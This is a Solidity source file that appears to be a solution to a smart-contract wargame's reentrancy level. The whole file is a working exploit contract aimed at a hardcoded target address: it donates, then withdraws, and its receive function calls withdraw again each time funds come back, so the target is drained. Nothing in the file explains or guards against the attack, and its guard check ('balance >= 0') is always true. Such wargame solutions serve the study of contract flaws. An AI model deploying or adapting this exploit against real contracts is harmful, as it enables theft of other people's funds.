// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import "./Reentrance.sol";

interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract Reenter {
    Reentrance target;
    uint public amount = 1 ether;    //withdrawal amount

    constructor() public payable {
        target = Reentrance(0xe6BA07257a9321e755184FB2F995e0600E78c16D);
    }

    function attack() public {
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance >= 0 ) {
            target.withdraw(amount);
        }
    }
}

